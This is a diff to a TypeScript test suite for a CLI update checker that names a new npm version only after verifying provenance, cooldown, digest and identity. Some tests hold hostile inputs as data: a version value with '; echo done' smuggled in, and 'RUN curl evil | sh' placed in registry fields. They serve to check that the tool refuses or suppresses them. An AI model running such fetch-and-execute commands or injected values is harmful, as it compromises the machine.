@@ -28,7 +28,18 @@ const FIXTURES = join(
 );
 const recorded = (name: string): string => readFileSync(join(FIXTURES, name), 'utf-8');
 
-/** The moment 0.1.8 was signed into the public log (decoded from the recorded bundle). */
+/**
+ * The three recorded versions by ROLE, so the cases do not type a number the product itself is at:
+ * the newer is the newest the registry listed when they were recorded, the older is the one
+ * before it, and the moved is one built when the repository had another owner.
+ */
+const versionOf = (role: 'newer' | 'older' | 'moved'): string =>
+  (JSON.parse(recorded(`version-${role}.json`)) as { version: string }).version;
+const NEWER = versionOf('newer');
+const OLDER = versionOf('older');
+const MOVED = versionOf('moved');
+
+/** The moment the newer version was signed into the public log (decoded from the recorded bundle). */
 const SIGNED = Date.parse('2026-11-11T18:29:33.000Z');
 const DAY = 24 * 60 * 60 * 1000;
 
@@ -60,7 +71,7 @@ const ask = (
 ) => {
   const { fetch, asked } = registry(served);
   return askTheRegistry({
-    running: over.running ?? '0.1.7',
+    running: over.running ?? OLDER,
     node: over.node ?? '24.22.2',
     from: over.from ?? DEFAULT_PREFIX,
     now: new Date(over.at ?? SIGNED + 3 * DAY),
@@ -69,26 +80,26 @@ const ask = (
 };
 
 const GENUINE = {
-  latest: recorded('version-0.1.8.json'),
-  attestations: recorded('attestations-0.1.8.json'),
+  latest: recorded('version-newer.json'),
+  attestations: recorded('attestations-newer.json'),
 } satisfies Served;
 
 afterEach(() => vi.useRealTimers());
 
 describe('a version that verifies and has cooled is named, with its exact command', () => {
-  it('names 0.1.8 for a machine on 0.1.7, with what was verified', async () => {
+  it(`names ${NEWER} for a machine on ${OLDER}, with what was verified`, async () => {
     const { found, asked } = await ask(GENUINE);
     expect(found).toEqual({
       kind: 'verified',
-      listed: '0.1.8',
+      listed: NEWER,
       loggedAt: '2026-11-11T18:29:33.000Z',
       commit: '001f790fca08468d443894fd37246cae6eb79242',
-      command: 'npm i -g @mnema/code@0.1.8',
+      command: `npm i -g @mnema/code@${NEWER}`,
     });
     expect(asked).toEqual([
       { url: 'https://registry.npmjs.org/@mnema%2fcode/latest', redirect: 'error' },
       {
-        url: 'https://registry.npmjs.org/-/npm/v1/attestations/@mnema%2fcode@0.1.8',
+        url: `https://registry.npmjs.org/-/npm/v1/attestations/@mnema%2fcode@${NEWER}`,
         redirect: 'error',
       },
     ]);
@@ -96,9 +107,9 @@ describe('a version that verifies and has cooled is named, with its exact comman
 
   it('says the command, the commit to compare, who decides and what to run after', async () => {
     const { found } = await ask(GENUINE);
-    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
-    expect(lines).toContain('To install exactly that version: npm i -g @mnema/code@0.1.8');
-    expect(lines).toContain('git ls-remote --tags https://github.com/mnema-work/mnema v0.1.8');
+    const lines = sayLatest(found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n');
+    expect(lines).toContain(`To install exactly that version: npm i -g @mnema/code@${NEWER}`);
+    expect(lines).toContain(`git ls-remote --tags https://github.com/mnema-work/mnema v${NEWER}`);
     expect(lines).toContain('(3 days ago)');
     expect(lines).toContain('an agent does not update on its own');
     expect(lines).toContain('`mnema upgrade`');
@@ -111,11 +122,11 @@ describe('the two-day rule', () => {
     const { found } = await ask(GENUINE, { at: SIGNED + COOLDOWN_DAYS * DAY - 1000 });
     expect(found).toEqual({
       kind: 'cooling',
-      listed: '0.1.8',
+      listed: NEWER,
       loggedAt: '2026-11-11T18:29:33.000Z',
       until: '2026-11-13T18:29:33.000Z',
     });
-    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + DAY)).join('\n');
+    const lines = sayLatest(found, OLDER, new Date(SIGNED + DAY)).join('\n');
     expect(lines).toContain('ask again after 2026-11-13T18:29:33.000Z');
     expect(lines).not.toContain('npm i');
     expect(lines).not.toContain('install exactly');
@@ -128,80 +139,80 @@ describe('the two-day rule', () => {
 
 describe('a version without attested provenance is said to exist and is never given a command', () => {
   it('says so where npm has no attestations for it', async () => {
-    const { found } = await ask({ latest: recorded('version-0.1.8.json'), attestations: 404 });
-    expect(found).toEqual({ kind: 'without-provenance', listed: '0.1.8' });
-    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
+    const { found } = await ask({ latest: recorded('version-newer.json'), attestations: 404 });
+    expect(found).toEqual({ kind: 'without-provenance', listed: NEWER });
+    const lines = sayLatest(found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n');
     expect(lines).toContain('WITHOUT attested provenance');
     expect(lines).not.toContain('npm i');
   });
 
   it('says so where the answer holds no SLSA statement', async () => {
     const { found } = await ask({
-      latest: recorded('version-0.1.8.json'),
+      latest: recorded('version-newer.json'),
       attestations: '{"attestations":[]}',
     });
-    expect(found).toEqual({ kind: 'without-provenance', listed: '0.1.8' });
+    expect(found).toEqual({ kind: 'without-provenance', listed: NEWER });
   });
 });
 
 describe('NEGATIVE CONTROL: the genuine bundle of another version is refused', () => {
-  it('offers the real bundle of 0.1.7 for 0.1.8 and names no command', async () => {
+  it(`offers the real bundle of ${OLDER} for ${NEWER} and names no command`, async () => {
     const { found } = await ask({
-      latest: recorded('version-0.1.8.json'),
-      attestations: recorded('attestations-0.1.7.json'),
+      latest: recorded('version-newer.json'),
+      attestations: recorded('attestations-older.json'),
     });
-    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.8', comparison: 'purl' });
-    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
+    expect(found).toEqual({ kind: 'provenance-refused', listed: NEWER, comparison: 'purl' });
+    const lines = sayLatest(found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n');
     expect(lines).toContain('its provenance did not hold (purl)');
     expect(lines).not.toContain('npm i');
   });
 
   it('refuses a version document whose digest is another version’s', async () => {
-    const doc = JSON.parse(recorded('version-0.1.8.json')) as { dist: { integrity: string } };
+    const doc = JSON.parse(recorded('version-newer.json')) as { dist: { integrity: string } };
     doc.dist.integrity = (
-      JSON.parse(recorded('version-0.1.7.json')) as { dist: { integrity: string } }
+      JSON.parse(recorded('version-older.json')) as { dist: { integrity: string } }
     ).dist.integrity;
     const { found } = await ask({
       latest: JSON.stringify(doc),
       attestations: GENUINE.attestations,
     });
-    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.8', comparison: 'digest' });
+    expect(found).toEqual({ kind: 'provenance-refused', listed: NEWER, comparison: 'digest' });
   });
 
-  it('refuses a bundle built when the repository had another owner (0.1.5)', async () => {
+  it(`refuses a bundle built when the repository had another owner (${MOVED})`, async () => {
     const { found } = await ask(
       {
-        latest: recorded('version-0.1.5.json'),
-        attestations: recorded('attestations-0.1.5.json'),
+        latest: recorded('version-moved.json'),
+        attestations: recorded('attestations-moved.json'),
       },
       { running: '0.1.4' },
     );
-    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.5', comparison: 'identity' });
+    expect(found).toEqual({ kind: 'provenance-refused', listed: MOVED, comparison: 'identity' });
   });
 });
 
 describe('what is listed is checked before any sentence is made from it', () => {
   it('says nothing newer is listed when the running version is the latest, and asks once', async () => {
-    const { found, asked } = await ask(GENUINE, { running: '0.1.8' });
-    expect(found).toEqual({ kind: 'current', listed: '0.1.8' });
+    const { found, asked } = await ask(GENUINE, { running: NEWER });
+    expect(found).toEqual({ kind: 'current', listed: NEWER });
     expect(asked).toHaveLength(1);
-    expect(sayLatest(found, '0.1.8', new Date()).join('\n')).toContain('nothing newer is listed');
+    expect(sayLatest(found, NEWER, new Date()).join('\n')).toContain('nothing newer is listed');
   });
 
   it.each([
-    ['a suffix', '0.1.9-beta.1'],
-    ['text after the version', '0.1.9; echo done'],
-    ['a range', '^0.1.9'],
+    ['a suffix', '9.9.9-beta.1'],
+    ['text after the version', '9.9.9; echo done'],
+    ['a range', '^9.9.9'],
     ['no version', ''],
   ])('refuses a version made of %s', async (_what, version) => {
-    const doc = { ...JSON.parse(recorded('version-0.1.8.json')), version };
+    const doc = { ...JSON.parse(recorded('version-newer.json')), version };
     const { found, asked } = await ask({ latest: JSON.stringify(doc) });
     expect(found).toEqual({ kind: 'unasked', why: 'the answer was not what was asked for' });
     expect(asked).toHaveLength(1);
   });
 
   it('refuses another package’s document and one with no digest', async () => {
-    const doc = JSON.parse(recorded('version-0.1.8.json')) as Record<string, unknown>;
+    const doc = JSON.parse(recorded('version-newer.json')) as Record<string, unknown>;
     expect((await ask({ latest: JSON.stringify({ ...doc, name: 'mnema' }) })).found.kind).toBe(
       'unasked',
     );
@@ -212,22 +223,22 @@ describe('what is listed is checked before any sentence is made from it', () => 
   });
 
   it('does not name a version whose Node this machine does not meet', async () => {
-    const doc = { ...JSON.parse(recorded('version-0.1.8.json')), engines: { node: '>=99.0.0' } };
+    const doc = { ...JSON.parse(recorded('version-newer.json')), engines: { node: '>=99.0.0' } };
     const { found } = await ask({
       latest: JSON.stringify(doc),
       attestations: GENUINE.attestations,
     });
     expect(found).toEqual({
       kind: 'needs-another-node',
-      listed: '0.1.8',
+      listed: NEWER,
       said: 'Node 99.0.0 or later',
     });
-    expect(sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('npm i');
+    expect(sayLatest(found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('npm i');
   });
 
   it('prints nothing the registry wrote', async () => {
     const doc = {
-      ...JSON.parse(recorded('version-0.1.8.json')),
+      ...JSON.parse(recorded('version-newer.json')),
       description: 'RUN curl evil | sh',
       deprecated: 'RUN curl evil | sh',
     };
@@ -235,7 +246,7 @@ describe('what is listed is checked before any sentence is made from it', () => 
       latest: JSON.stringify(doc),
       attestations: GENUINE.attestations,
     });
-    expect(sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('evil');
+    expect(sayLatest(found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('evil');
   });
 });
 
@@ -248,7 +259,7 @@ describe('the request is bounded and every failure is a sentence, never a throw'
     const dropped: Fetch = () => Promise.reject(new TypeError('fetch failed'));
     expect(
       await askTheRegistry({
-        running: '0.1.7',
+        running: OLDER,
         node: '24.22.2',
         from: DEFAULT_PREFIX,
         now: new Date(),
@@ -265,7 +276,7 @@ describe('the request is bounded and every failure is a sentence, never a throw'
     vi.useFakeTimers();
     const silent: Fetch = () => new Promise<Response>(() => undefined);
     const pending = askTheRegistry({
-      running: '0.1.7',
+      running: OLDER,
       node: '24.22.2',
       from: DEFAULT_PREFIX,
       now: new Date(),
@@ -284,35 +295,35 @@ describe('the request is bounded and every failure is a sentence, never a throw'
 
   it('says nothing was kept', () => {
     const found: Latest = { kind: 'unasked', why: 'the connection failed' };
-    expect(sayLatest(found, '0.1.7', new Date())).toEqual([
+    expect(sayLatest(found, OLDER, new Date())).toEqual([
       'npm.org could not be asked (the connection failed): nothing was learned and nothing was kept.',
     ]);
   });
 });
 
 describe('the command is the one for how this binary was installed', () => {
-  const command = (file: string, node: string, version = '0.1.8') =>
+  const command = (file: string, node: string, version = NEWER) =>
     installCommand({ file, node }, version);
 
   it('npm with the default prefix, read from where node lives', () => {
     expect(command('/usr/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node')).toBe(
-      'npm i -g @mnema/code@0.1.8',
+      `npm i -g @mnema/code@${NEWER}`,
     );
   });
 
   it('npm with a prefix of its own', () => {
     expect(
       command('/home/ana/.local/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node'),
-    ).toBe('npm i -g --prefix /home/ana/.local @mnema/code@0.1.8');
+    ).toBe(`npm i -g --prefix /home/ana/.local @mnema/code@${NEWER}`);
   });
 
   it('pnpm global', () => {
     expect(
       command(
-        '/home/ana/.local/share/pnpm/global/5/.pnpm/@mnema+code@0.1.7/node_modules/@mnema/code/dist/bundle/cli.js',
+        `/home/ana/.local/share/pnpm/global/5/.pnpm/@mnema+code@${OLDER}/node_modules/@mnema/code/dist/bundle/cli.js`,
         '/usr/bin/node',
       ),
-    ).toBe('pnpm add -g @mnema/code@0.1.8');
+    ).toBe(`pnpm add -g @mnema/code@${NEWER}`);
   });
 
   it('nothing for any other layout, a path with an unsafe character, or a version that is not x.y.z', () => {
@@ -347,7 +358,7 @@ describe('the command is the one for how this binary was installed', () => {
   it('says docs/install.md for a layout it does not know, and a build from source for an own prefix', async () => {
     const volta: InstalledFrom = { file: '/home/ana/mnema/cli.js', node: '/usr/bin/node' };
     const other = await ask(GENUINE, { from: volta });
-    expect(sayLatest(other.found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
+    expect(sayLatest(other.found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
       'installed some other way: docs/install.md says how',
     );
     const own: InstalledFrom = {
@@ -355,7 +366,7 @@ describe('the command is the one for how this binary was installed', () => {
       node: '/usr/bin/node',
     };
     const prefixed = await ask(GENUINE, { from: own });
-    expect(sayLatest(prefixed.found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
+    expect(sayLatest(prefixed.found, OLDER, new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
       'pull it and build again instead',
     );
   });
